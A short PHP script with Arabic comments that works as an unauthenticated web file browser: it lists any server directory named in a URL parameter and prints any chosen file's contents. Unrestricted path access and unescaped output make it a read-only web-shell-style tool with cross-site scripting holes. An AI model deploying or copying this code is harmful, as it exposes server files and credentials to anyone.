<?php
// تحديد المسار الحالي أو الرجوع إلى المسار الرئيسي إذا لم يتم تحديد مسار
$currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
$parentPath = dirname($currentPath);

// عرض الأزرار
echo "<a href='?path=$parentPath'>Back</a> | <a href='?'>Home</a><br>";

// عرض الـ path الحالي
echo "الـ Path الحالي: " . $currentPath . "<br>";

// عرض الملفات والمجلدات في الـ path الحالي
$files = scandir($currentPath);
echo "الملفات الموجودة في هذا الـ Path:<br>";
foreach ($files as $file) {
    $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
    if (is_dir($filePath)) {
        echo "<a href='?path=" . urlencode($filePath) . "'>$file</a><br>";
    } else {
        // عرض الروابط لمشاهدة محتوى الملفات
        echo "<a href='?path=" . urlencode($currentPath) . "&view=" . urlencode($file) . "'>$file</a><br>";
    }
}

// إذا تم تحديد ملف للمشاهدة، عرض محتوياته
if (isset($_GET['view'])) {
    $viewPath = $currentPath . DIRECTORY_SEPARATOR . $_GET['view'];
    if (file_exists($viewPath)) {
        echo "<hr>";
        echo "<h2>مشاهدة ملف: " . $_GET['view'] . "</h2>";
        echo "<pre>" . htmlspecialchars(file_get_contents($viewPath)) . "</pre>";
    }
}
?>
